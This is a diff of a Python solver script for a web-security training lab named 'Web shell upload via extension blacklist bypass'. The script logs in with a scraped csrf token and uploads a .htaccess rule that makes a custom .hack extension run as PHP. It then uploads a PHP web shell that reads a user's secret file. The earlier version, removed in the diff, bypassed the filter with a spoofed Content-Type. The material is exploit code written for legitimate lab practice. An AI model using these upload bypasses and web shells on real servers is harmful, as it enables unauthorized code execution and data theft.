@@ -1,20 +1,21 @@
-###################################################################
+##########################################################################################
 #
 # Author: Ahmed Elqalawy (@elqal3awii)
 #
 # Date: 12/10/2023
 #
-# Lab: Web shell upload via Content-Type restriction bypass
+# Lab: Web shell upload via extension blacklist bypass
 #
 # Steps: 1. Fetch login page
 #        2. Extract csrf token and session cookie
 #        3. Login as wiener
 #        4. Fetch wiener profile
-#        5. Upload the shell file with the Content-Type changed
-#        6. Fetch the uploaded shell file to read the secret
-#        7. Submit the solution
+#        5. Upload a .htaccess file containing a mapping rule to a custom extension
+#        6. Upload the shell file with the custom extension
+#        7. Fetch the uploaded shell file to read the secret
+#        8. Submit the solution 
 #
-###################################################################
+##########################################################################################
 
 
 ###########
@@ -30,7 +31,7 @@ from colorama import Fore
 ###########
 
 # change this to your lab URL
-url = "https://0adf0062048f04eb82cb3eb800690093.web-security-academy.net"
+url = "https://0ac7003e04332753803b4e5300b2006e.web-security-academy.net"
 
 try:  
     # fetch login page
@@ -94,17 +95,14 @@ print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. " + Fore.GREEN + "OK")
 # extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", wiener.content.decode())[0]
 
-# the shell file to be uploaded
-shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""
-
-# the shell file name
-# you can change this to what you want
-shell_file_name = "hack.php"
+# the .htaccess with our own rule
+# this rule maps the files with the extension .hack to be executed as a php files
+# you can change .hack to what you want but change the shell_file_name variable accordingly
+htaccess_file = "AddType application/x-httpd-php .hack"
 
 # set the avatar
-# change the Content-Type to bypass filter
 files = {
-    "avatar": (shell_file_name, shell_file, "image/png")
+    "avatar": (".htaccess", htaccess_file, "text/plain")
 }
 
 # set the other data to send with the avatar
@@ -114,14 +112,42 @@ data = {
 }
 
 try:  
-    # upload shell file
+    # upload the .htaccess file
+    requests.post(f"{url}/my-account/avatar", data, files=files, cookies=cookies)
+    
+except:
+    print(Fore.RED + "[!] Failed to upload the .htaccess file through exception")
+    exit(1)
+
+print(Fore.WHITE + "⦗5⦘ Uploading a .htaccess file containing a mapping rule to a custom extension.. " + Fore.GREEN + "OK")
+
+# the shell file to be uploaded
+shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""
+
+# the shell file name
+# you can change this to what you want but keep the extension .hack unless you changed it in the .htaccess rule above
+shell_file_name = "shell.hack"
+
+# set the avatar
+files = {
+    "avatar": (shell_file_name, shell_file, "application/x-php")
+}
+
+# set the other data to send with the avatar
+data = {
+    "user": "wiener",
+    "csrf": csrf 
+}
+
+try:  
+    # upload the shell file
     requests.post(f"{url}/my-account/avatar", data, files=files, cookies=cookies)
     
 except:
     print(Fore.RED + "[!] Failed to upload the shell file through exception")
     exit(1)
 
-print(Fore.WHITE + "⦗5⦘ Uploading the shell file with the Content-Type changed.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗6⦘ Uploading the shell file with the custom extension.. " + Fore.GREEN + "OK")
 
 try:
     # fetch the uploaded shell file
@@ -131,7 +157,7 @@ except:
     print(Fore.RED + "[!] Failed to fetch the uploaded shell file through exception")
     exit(1)
 
-print(Fore.WHITE + "⦗6⦘ Fetching the uploaded shell file to read the secret.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗7⦘ Fetching the uploaded shell file to read the secret.. " + Fore.GREEN + "OK")
 
 # get carlos secret
 secret = uploaded_shell.text
@@ -151,7 +177,7 @@ except:
     print(Fore.RED + "[!] Failed to submit the solution through exception")
     exit(1)
 
-print(Fore.WHITE + "⦗7⦘ Submitting the solution.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗8⦘ Submitting the solution.. " + Fore.GREEN + "OK")
 print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
 
 
